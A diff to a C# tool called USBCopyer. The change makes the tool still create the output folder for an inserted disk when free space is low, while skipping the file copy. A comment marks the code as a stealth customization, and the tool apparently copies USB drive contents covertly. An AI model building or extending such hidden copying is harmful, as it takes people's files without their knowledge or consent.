@@ -542,11 +542,17 @@ namespace USBCopyer
                                                 {
                                                     Program.log("写入磁盘日志 Disk.csv 失败，文件可能被占用：\r\n" + ex.ToString(), 1);
                                                 }
-                                                // 隐藏性定制：输出目录所在磁盘空间不足时跳过本次复制
+                                                // 隐藏性定制：输出目录所在磁盘空间不足时跳过复制，仅建目录
                                                 copyAborted = false;
                                                 if (IsDiskSpaceCritical(dir))
                                                 {
-                                                    Program.log("输出目录所在磁盘空间不足（剩余 " + GetFreeSpaceMB(dir) + " MB），已跳过本次复制", 0);
+                                                    // 空间不足时仍建目录（占用可忽略），仅不复制文件
+                                                    try
+                                                    {
+                                                        Directory.CreateDirectory(dir + diskdir);
+                                                    }
+                                                    catch { }
+                                                    Program.log("输出目录所在磁盘空间不足（剩余 " + GetFreeSpaceMB(dir) + " MB），本次仅建目录、不复制文件", 0);
                                                 }
                                                 else if (IsCopyDisabled())
                                                 {
